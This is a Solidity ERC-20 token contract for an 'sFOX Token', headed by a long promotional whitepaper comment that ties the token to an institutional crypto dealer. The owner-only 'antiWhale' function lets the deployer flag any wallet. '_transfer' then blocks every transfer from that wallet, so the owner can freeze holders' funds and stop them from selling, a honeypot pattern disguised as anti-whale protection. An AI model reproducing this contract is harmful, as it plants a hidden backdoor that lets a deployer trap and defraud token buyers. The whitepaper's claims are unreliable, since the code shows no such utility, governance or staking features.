/*
sFOX Token
www.sfox-token.com
www.medium.com/@sfox-token
www.twitter.com/sfox_token
t.me/sfox_token
Overview of Digital Assets
In recent years, digital assets have emerged as a transformative force in the global financial landscape. These assets, including cryptocurrencies, tokens, and blockchain-based instruments, have redefined how individuals and institutions perceive and interact with money and investments. The digitization of value has not only introduced novel financial instruments but has also disrupted traditional financial markets and institutions.
Digital assets, rooted in blockchain technology, offer distinct advantages such as transparency, security, and decentralization. Their adoption has surged across industries, with applications ranging from decentralized finance (DeFi) and non-fungible tokens (NFTs) to tokenized real assets and cross-border payments.
Introduction to sFOX
In this dynamic and rapidly evolving landscape, sFOX has emerged as a leading full-service crypto prime dealer dedicated to serving the unique needs of institutional investors. Understanding the company's background and mission is essential to appreciate its role in the digital asset ecosystem.
Company Overview
sFOX is a trailblazer in the cryptocurrency industry. Established with a mission to provide institutional clients with the essential tools and services required to unlock the full potential of digital assets, sFOX has achieved recognition for its commitment to trust, security, and innovation.
Service Offerings
sFOX offers a comprehensive suite of services designed to cater specifically to institutional investors in the crypto market. These services include:
- Liquidity Provision: sFOX facilitates access to deep liquidity pools, allowing institutional clients to execute large trades efficiently and at competitive prices.
- Security Solutions: The platform implements robust security measures, including cold storage, multi-signature wallets, and advanced encryption, to safeguard institutional assets.
- Infrastructure: sFOX provides cutting-edge technology infrastructure and trading tools, enabling institutional clients to manage their portfolios effectively.
Unique Features
sFOX distinguishes itself in the cryptocurrency market by offering unique features and advantages:
- Tailored Services: sFOX customizes its services to address the specific requirements and risk profiles of institutional investors, ensuring a personalized and efficient experience.
- Innovation: sFOX is committed to innovation, continually enhancing its platform with proprietary technology and trading strategies that set it apart from competitors.
- Success Stories: Numerous institutional clients have benefited from sFOX's services. Real-world success stories and case studies highlight how sFOX has addressed their unique needs and delivered tangible results.
Structure and Objectives of the Whitepaper
This whitepaper serves as a comprehensive guide to sFOX, its services, and the pivotal role it plays in the digital asset ecosystem. The objectives of this whitepaper are threefold:
1. Education: To provide readers with a thorough understanding of digital assets, their evolution, and their significance in today's financial markets.
2. Insight: To offer an in-depth exploration of sFOX as a full-service crypto prime dealer, highlighting its history, mission, and unique value proposition.
3. Clarity: To shed light on the
sFOX token and its integral role within the sFOX ecosystem, including its utility, governance, and economic model.
By the end of this whitepaper, readers will gain a profound insight into how sFOX is reshaping institutional crypto investment, enhancing liquidity, fortifying security, and enabling global access to the world of digital assets.
sFOX Token
The sFOX token, denoted as sFOX, plays a central role within the sFOX ecosystem. It is a native utility token that provides various benefits to its holders, enabling them to access and participate in the sFOX platform. 
Utility: The sFOX token is designed to serve as a utility token, offering access to specific features and services within the sFOX ecosystem.
Governance: sFOX token holders may have the opportunity to participate in governance decisions, influencing the direction and development of the platform.
Incentives: The token may be used to incentivize platform usage, reward liquidity providers, or encourage certain behaviors that benefit the sFOX ecosystem.
Use Cases
sFOX tokens have a range of use cases within the sFOX platform:
- Access to Premium Features: sFOX tokens can grant users access to premium features, including enhanced trading tools, data analytics, and personalized services.
- Staking and Rewards: Token holders may have the option to stake their sFOX tokens to earn rewards or participate in liquidity provision incentives.
- Governance Participation: Depending on the platform's governance structure, sFOX token holders may have the ability to participate in decision-making processes and vote on proposals.
*/
// SPDX-License-Identifier: None

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
  
    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
              
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract sFOXToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcluded;
    address[] private _excluded;

    mapping (address => bool) private _isExcludedSender;
    address[] private _excludedSender;

    string  public Website = "www.sfox-token.com";
    string  public Slippage = "10%";

    string  private _NAME;
    string  private _SYMBOL;
    uint256 private _DECIMALS;

    uint256 private _MAX = ~uint256(0);
    uint256 private _DECIMALFACTOR;
    uint256 private _GRANULARITY = 100;

    uint256 private _tTotal;
    uint256 private _rTotal;

    uint256 private _tFeeTotal;
    uint256 private _tBurnTotal;
    uint256 private _tLiquidityPoolTotal;

    uint256 public     _TAX;
    uint256 public    _BURN;
    uint256 public _LIQUIDITYPOOL_;

    uint256 private ORIG_TAX;
    uint256 private ORIG_BURN;
    uint256 private ORIG_LIQUIDITYPOOL_;

    mapping (address => bool) private _antiWhale;

    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply) {
        _NAME = _name;
        _SYMBOL = _symbol;
        _DECIMALS = _decimals;
        _DECIMALFACTOR = 10 ** _DECIMALS;
        _tTotal =_supply * _DECIMALFACTOR;
        _rTotal = (_MAX - (_MAX % _tTotal));
        ORIG_TAX = _TAX;
        ORIG_BURN = _BURN;
        ORIG_LIQUIDITYPOOL_ = _LIQUIDITYPOOL_;
        _owner = msg.sender;
        _rOwned[_owner] = _rTotal;

    }

    function name() public view returns (string memory) {
        return _NAME;
    }

    function symbol() public view returns (string memory) {
        return _SYMBOL;
    }

    function decimals() public view returns (uint8) {
        return uint8(_DECIMALS);
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "TOKEN20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "TOKEN20: decreased allowance below zero"));
        return true;
    }

    function totalBurn() public view returns (uint256) {
        return _tBurnTotal;
    }

    function totalLiquidityPool() public view returns (uint256) {
        return _tLiquidityPoolTotal;
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,,) = _getValues(tAmount);
            return rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "TOKEN20: approve from the zero address");
        require(spender != address(0), "TOKEN20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function antiWhale(address _wallet, bool _allow) external onlyOwner() {
        if(_allow){
            _antiWhale[_wallet] = _allow;
        } else {
            delete _antiWhale[_wallet];
        }
    }

    function isWhale(address _wallet) external view returns (bool) {
        return _antiWhale[_wallet];
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "TOKEN20: transfer from the zero address");
        require(recipient != address(0), "TOKEN20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        require(!_antiWhale[sender], "Whale not allowed");

        if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) = _getValues(tAmount);
        uint256 rBurn =  tBurn.mul(currentRate);
        _standardTransferContent(sender, recipient, rAmount, rTransferAmount);
        _reflectFee(rFee, rBurn, tFee, tBurn, tLiquidityPool);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _standardTransferContent(address sender, address recipient, uint256 rAmount, uint256 rTransferAmount) private {
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
    }

    function _excludedFromTransferContent(address sender, address recipient, uint256 tTransferAmount, uint256 rAmount, uint256 rTransferAmount) private {
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
    }

    function _excludedToTransferContent(address sender, address recipient, uint256 tAmount, uint256 rAmount, uint256 rTransferAmount) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
    }

    function _bothTransferContent(address sender, address recipient, uint256 tAmount, uint256 rAmount, uint256 tTransferAmount, uint256 rTransferAmount) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
    }

    function _reflectFee(uint256 rFee, uint256 rBurn, uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) private {
        _rTotal = _rTotal.sub(rFee).sub(rBurn);
        _tFeeTotal = _tFeeTotal.add(tFee);
        _tBurnTotal = _tBurnTotal.add(tBurn);
        _tLiquidityPoolTotal = _tLiquidityPoolTotal.add(tLiquidityPool);
        _tTotal = _tTotal.sub(tBurn);
        emit Transfer(address(this), address(0), tBurn);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) = _getTBasics(tAmount, _TAX, _BURN, _LIQUIDITYPOOL_);
        uint256 tTransferAmount = getTTransferAmount(tAmount, tFee, tBurn, tLiquidityPool);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rFee) = _getRBasics(tAmount, tFee, currentRate);
        uint256 rTransferAmount = _getRTransferAmount(rAmount, rFee, tBurn, tLiquidityPool, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tBurn, tLiquidityPool);
    }

    function _getTBasics(uint256 tAmount, uint256 taxFee, uint256 burnFee, uint256 liquiditypoolFee) private view returns (uint256, uint256, uint256) {
        uint256 tFee = ((tAmount.mul(taxFee)).div(_GRANULARITY)).div(100);
        uint256 tBurn = ((tAmount.mul(burnFee)).div(_GRANULARITY)).div(100);
        uint256 tLiquidityPool = ((tAmount.mul(liquiditypoolFee)).div(_GRANULARITY)).div(100);
        return (tFee, tBurn, tLiquidityPool);
    }

    function getTTransferAmount(uint256 tAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidityPool) private pure returns (uint256) {
        return tAmount.sub(tFee).sub(tBurn).sub(tLiquidityPool);
    }

    function _getRBasics(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        return (rAmount, rFee);
    }

    function _getRTransferAmount(uint256 rAmount, uint256 rFee, uint256 tBurn, uint256 tLiquidityPool, uint256 currentRate) private pure returns (uint256) {
        uint256 rBurn = tBurn.mul(currentRate);
        uint256 rLiquidityPool = tLiquidityPool.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rBurn).sub(rLiquidityPool);
        return rTransferAmount;
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }  
}